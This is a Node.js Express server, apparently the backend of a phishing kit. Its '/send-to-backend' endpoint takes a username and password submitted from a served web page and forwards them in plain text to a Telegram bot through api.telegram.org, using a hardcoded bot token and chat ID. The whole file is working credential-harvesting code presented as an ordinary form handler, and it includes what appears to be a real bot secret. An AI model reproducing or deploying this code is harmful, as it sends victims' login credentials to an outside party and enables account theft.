const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public'));

// IMPORTANT: These should be environment variables, not hardcoded
const BOT_TOKEN = process.env.BOT_TOKEN || '7973296853:AAEd_OT1S9H-CaJx4hK94Zj-ec1Vl47rAuY';
const CHAT_ID = process.env.CHAT_ID || '5605345504';

// Basic validation middleware
const validateInput = (req, res, next) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Username and password are required' 
        });
    }
    
    // Add more validation as needed
    next();
};

// Endpoint to handle form submission
app.post('/send-to-backend', validateInput, async (req, res) => {
    const { username, password } = req.body;

    try {
        const message = `New Login Details:\nUsername: ${username}\nPassword: ${password}`;
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
        });

        console.log('Notification sent to Telegram');
        res.json({ success: true, message: 'Notification sent' });
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error' 
        });
    }
});

// Serve index.html for the root route
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
